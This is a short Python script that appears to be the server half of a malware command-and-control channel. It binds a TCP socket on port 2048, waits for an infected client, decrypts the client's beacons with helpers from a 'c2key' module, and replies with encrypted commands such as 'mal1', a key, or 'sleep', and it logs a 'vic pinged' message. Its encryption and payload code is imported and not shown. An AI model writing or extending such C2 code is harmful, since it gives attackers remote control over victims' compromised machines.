#!/usr/bin/env python3
# if running on python versus windows exe
import socket
import time

#
# import from sub functions until its compiled exe
from c2key import *

HOST = '0.0.0.0'
PORT = 2048

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.bind((HOST, PORT))
z.listen(5)
print('> Started main server: ' + str(HOST) + ' (' + str(PORT)+')')
x,y = z.accept()
print('> Client connected: ' + str(y[0]) + ' unique = ' + str(y[1]))

while True:
    
    data = decryptData(x.recv(4096))
    if(data.__contains__('xxxx')): 
        print('vic pinged')
        time.sleep(0.5)
        x.send(encryptData('mal1'))
    elif(data == 'ineedkey'):
        print('yourkeysent:')
        time.sleep(0.5)
        x.send(encryptData('c2key'))
    elif(data == 'c2ready'): 
        print(data)
        time.sleep(0.5)
        x.send(encryptData('sleep'))
    elif(data == 'iamhere'): 
        print("client says iamhere")
        time.sleep(0.5)
        x.send(encryptData('sleep'))
    else: 
        print('last data was sleeper')
        time.sleep(1)
        x.send(encryptData('sleep'))